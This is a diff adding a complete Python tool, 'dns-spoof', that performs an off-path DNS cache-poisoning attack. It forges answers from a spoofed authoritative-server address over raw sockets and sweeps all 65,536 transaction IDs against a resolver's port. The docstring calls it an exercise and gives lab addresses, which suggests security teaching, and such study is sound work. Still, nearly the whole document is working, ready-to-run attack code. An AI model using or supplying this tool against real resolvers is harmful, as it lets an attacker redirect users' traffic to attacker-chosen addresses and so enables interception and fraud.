@@ -1,0 +1,144 @@
+#!/usr/bin/env python3
+"""dns-spoof - flood a resolver with forged DNS answers, one per transaction ID.
+
+An off-path attacker cannot see the resolver's query, so it cannot read the
+transaction ID out of it. What it can do is send an answer for every ID the
+resolver might have used. A resolver accepts a UDP answer when four things match
+the query it is waiting on: the source address, the source port (53), its own
+outgoing source port, and the 16-bit transaction ID. Three of the four are known
+or fixed here, so this sweeps the fourth.
+
+Every value is named on the command line and nothing is defaulted, because
+choosing them is the exercise: which address to forge, which port the resolver
+listens for the answer on, which name to answer for, and what to answer with.
+
+  dns-spoof --from 107.2.0.10 --to 107.1.0.10 --dport 33333 \
+            --qname www.uni.lab --answer 107.3.0.10 --ttl 86400 --seconds 8
+
+The packets carry a UDP checksum of zero, which RFC 768 permits over IPv4 and
+which means one prebuilt packet can be reused with only the two transaction-ID
+bytes rewritten. That is what makes a plain Python loop fast enough to cover all
+65,536 IDs in a fraction of a second.
+"""
+import argparse
+import socket
+import struct
+import sys
+import time
+
+DNS_PORT = 53
+IP_HDR_LEN = 20
+UDP_HDR_LEN = 8
+TXID_OFFSET = IP_HDR_LEN + UDP_HDR_LEN   # the ID is the first field of the DNS header
+
+
+def checksum16(data):
+    """The one's-complement sum RFC 791 specifies for the IPv4 header."""
+    if len(data) % 2:
+        data += b"\x00"
+    total = 0
+    for i in range(0, len(data), 2):
+        total += (data[i] << 8) | data[i + 1]
+    while total >> 16:
+        total = (total & 0xFFFF) + (total >> 16)
+    return ~total & 0xFFFF
+
+
+def encode_name(name):
+    """A DNS name on the wire: each label prefixed by its length, then a zero."""
+    out = b""
+    for label in name.rstrip(".").split("."):
+        if not 1 <= len(label) <= 63:
+            sys.exit(f"dns-spoof: bad label in {name!r}")
+        out += bytes([len(label)]) + label.encode("ascii")
+    return out + b"\x00"
+
+
+def dns_answer(qname, address, ttl):
+    """A complete DNS response message for one A question, transaction ID zero.
+
+    Flags 0x8580: QR (this is a response), AA (the sender claims authority for
+    the name), RD copied back from the query, RA (recursion available), rcode 0.
+    The answer's name is the compression pointer 0xC00C, which points at the
+    question's name twelve bytes into the message rather than repeating it.
+    """
+    header = struct.pack("!HHHHHH", 0, 0x8580, 1, 1, 0, 0)
+    question = encode_name(qname) + struct.pack("!HH", 1, 1)          # QTYPE A, QCLASS IN
+    rdata = socket.inet_aton(address)
+    answer = struct.pack("!HHHIH", 0xC00C, 1, 1, ttl, len(rdata)) + rdata
+    return header + question + answer
+
+
+def ip_udp_packet(src, dst, sport, dport, payload):
+    """One IPv4 datagram carrying a UDP datagram, checksummed and ready to send."""
+    udp = struct.pack("!HHHH", sport, dport, UDP_HDR_LEN + len(payload), 0) + payload
+    total = IP_HDR_LEN + len(udp)
+    fields = [0x45, 0, total, 0x1D45, 0, 64, socket.IPPROTO_UDP, 0,
+              socket.inet_aton(src), socket.inet_aton(dst)]
+    header = struct.pack("!BBHHHBBH4s4s", *fields)
+    fields[7] = checksum16(header)
+    return struct.pack("!BBHHHBBH4s4s", *fields) + udp
+
+
+def main():
+    p = argparse.ArgumentParser(add_help=True, description=__doc__.splitlines()[0])
+    p.add_argument("--from", dest="src", required=True,
+                   help="source address to forge: the authoritative server the resolver asked")
+    p.add_argument("--to", dest="dst", required=True,
+                   help="the resolver's address")
+    p.add_argument("--dport", type=int, required=True,
+                   help="the resolver's outgoing source port, which the answer must be sent to")
+    p.add_argument("--qname", required=True,
+                   help="the name to answer for; it must match the question exactly")
+    p.add_argument("--answer", required=True,
+                   help="the address to put in the answer")
+    p.add_argument("--ttl", type=int, required=True,
+                   help="how long the resolver is told to keep the answer, in seconds")
+    p.add_argument("--seconds", type=float, required=True,
+                   help="how long to keep flooding")
+    args = p.parse_args()
+
+    if not 1 <= args.dport <= 65535:
+        sys.exit("dns-spoof: --dport must be a port number")
+
+    packet = bytearray(ip_udp_packet(args.src, args.dst, DNS_PORT, args.dport,
+                                     dns_answer(args.qname, args.answer, args.ttl)))
+
+    try:
+        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
+        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
+    except PermissionError:
+        sys.exit("dns-spoof: forging a source address needs CAP_NET_RAW")
+
+    target = (args.dst, 0)
+    view = memoryview(packet)
+    send = sock.sendto
+    print(f"[*] answering {args.qname} with {args.answer} (ttl {args.ttl})")
+    print(f"[*] forging {args.src}:{DNS_PORT} -> {args.dst}:{args.dport}, "
+          f"sweeping all 65536 transaction IDs for {args.seconds}s")
+
+    sent = 0
+    sweeps = 0
+    started = time.monotonic()
+    deadline = started + args.seconds
+    try:
+        while time.monotonic() < deadline:
+            for txid in range(65536):
+                packet[TXID_OFFSET] = txid >> 8
+                packet[TXID_OFFSET + 1] = txid & 0xFF
+                send(view, target)
+            sent += 65536
+            sweeps += 1
+    except KeyboardInterrupt:
+        pass
+    elapsed = time.monotonic() - started
+
+    print(f"[*] sent {sent} answers in {elapsed:.2f}s "
+          f"= {sent / elapsed:,.0f} packets/second, {sweeps} full sweep(s)")
+    if sweeps:
+        print(f"[*] one full sweep of the transaction-ID space took "
+              f"{elapsed / sweeps * 1000:.0f} ms")
+
+
+if __name__ == "__main__":
+    main()
